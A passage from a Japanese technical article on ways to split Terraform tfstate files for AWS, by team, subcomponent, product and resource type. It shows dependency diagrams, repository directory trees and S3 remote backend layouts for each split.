│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 sre-team # sreチーム      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── alb.tf      ├── cloudwatch.tf      ├── ec2.tf      ├── ecs.tf      ├── eks.tf      ├── iam.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する           ...【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別の場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    └── terraform.tfstate # frontendチームの状態を持つ│├── \uD83D\uDCC2 backend-team│    └── terraform.tfstate # backendチームの状態を持つ│└── \uD83D\uDCC2 sre-team      └── terraform.tfstate # sreチームの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...プロダクトのサブコンポーネント別 - ★★この分割方法についてプロダクトのサブコンポーネント (例：アプリ、ネットワーク、認証/認可、監視など) 別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、サブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Things to Know Before Working With Terraform – Part 1 | EndavaTerraform organization — Part I : What if you split your components ? | by Amine Charot | Medium▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。この分割方法は、後述のAWSリソースの種類グループとごっちゃになってしまう場合があるため、プロダクトのサブコンポーネントとして意識的に分割させる必要があります\uD83D\uDC4D【サブコンポーネント別】状態の依存関係図例えば、以下のサブコンポーネントに分割した状況と仮定します。application (Web3層系)auth (認証/認可系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、networkサブコンポーネントやauthサブコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロダクトのサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, APIGateway, CloudFront, EC2, ECS, EKS, RDS, S3, SNS, など)\\"]            auth[\\"auth-tfstate<br>(IAMなど)\\"]            monitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            application-..->network            application-..->auth            monitor-..->application        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end        end【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── alb.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせてtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チーム内のサブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図以下の運用チームに分割した状況と仮定します。また、各運用チームでTerraformを変更できる管理者が相当数するため、プロダクトのサブコンポーネント別にも分割したとします。frontendチームapplicationmonitorbackendチームapplicationmonitorsreチームapplicationauthmonitornetworkここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、sreチームの管理する tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            subgraph frontend-team               frontendApplication[\\"application-tfstate<br>(CloudFront, S3, など)\\"]               frontendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph backend-team                backendApplication[\\"application-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]                backendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph sre-team                sreApplication[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, EC2, ECS, EKS, SNS, など)\\"]                auth[\\"auth-tfstate<br>(IAM, など)\\"]                sreMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]                network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            end            frontendApplication-...->network            sreApplication-...->auth            sreApplication-...->network            backendApplication-...->auth            backendApplication-...->network            frontendMonitor-...->frontendApplication            sreMonitor-...->sreApplication            backendMonitor-...->backendApplication        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── ses.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-backend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── elasticache.tf│    ├── rds.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-sre-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── alb.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する            ...▼ 同じリポジトリの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、同じリポジトリで管理するとリポジトリが巨大になってしまいます。そのため、これはお勧めしません。【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # frontendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│         └── terraform.tfstate # frontendチームが管理するmonitorコンポーネントの状態を持つ│├── \uD83D\uDCC2 backend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # backendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│          └── terraform.tfstate # backendチームが管理するmonitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 sre-team      ├── \uD83D\uDCC2 application      │    └── terraform.tfstate # sreチームが管理するapplicationコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 auth      │    └── terraform.tfstate # sreチームが管理するauthコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 monitor      │    └── terraform.tfstate # sreチームが管理するmonitorコンポーネントの状態を持つ      │      └── \uD83D\uDCC2 network            └── terraform.tfstate # sreチームが管理するnetworkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...同じテナント内のプロダクト別この分割方法について同じテナント (例：同じAWSアカウントの同じVPC) 内に複数の小さなプロダクトがある場合、プロダクト別でtfstateファイルを分割し、中間層もこれに基づいて設計します。ここでいうプロダクトは、アプリを動かすプラットフォーム (例：EKS、ECS、AppRunner、EC2) とそれを取り巻くAWSリソースを指しています。この分割方法により、各プロダクトの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【同じテナント内のプロダクト】状態の依存関係図例えば、以下のプロダクトに分割した状況と仮定します。fooプロダクトbarプロダクト共有networkコンポーネント (例：VPC、Route53)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、共有networkコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 同じテナント内のプロダクト---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            foo-product[\\"foo-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            bar-product[\\"bar-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            network[\\"network-tfstate<br>(Route53, VPC)\\"]        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# fooプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-foo-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する      ...# barプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-bar-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する      ...# 共有networkコンポーネントの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-network-repository/├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── route53.tf├── vpc.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 foo-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 bar-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合同じテナント内のプロダクトの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 foo-product│    └── terraform.tfstate # fooプロダクトの状態を持つ│├── \uD83D\uDCC2 bar-product│    └── terraform.tfstate # barプロダクトの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの種類グループ別この分割方法についてAWSリソースの種類グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各AWSリソースの種類グループも管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。特にこの分割方法は、グループ数がどんどん増えていく可能性があります\uD83D\uDE07【種類グループ別】状態の依存関係図例えば、以下の種類グループに分割した状況と仮定します。application (Webサーバー、Appサーバー系)auth (認証/認可系)datastore (DBサーバー系)cicd (CI/CD系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、networkグループやauthグループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの種類グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>例: ALB, API Gateway, CloudFront, EC2, ECS, EKS, SNS, など\\"]            auth[\\"auth-tfstate<br>例: IAM, など\\"]            cicd[\\"cicd-tfstate<br>例: Code3兄弟, など\\"]            monitor[\\"monitor-tfstate<br>例: CloudWatch, など\\"]            network[\\"network-tfstate<br>例: Route53, VPC, など\\"]            datastore[\\"datastore-tfstate<br>例: ElastiCache, RDS, S3, など\\"]            application-....->auth            application-..->datastore            application-...->network            cicd-..->application            datastore-..->network            monitor-..->application            monitor-..->datastore       end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── alb.tf│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 cicd/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── codebuild.tf│    ├── codecommit.tf│    ├── codedeploy.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 datastore/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── rds.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから参照できるように、outputブロックを定義する      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 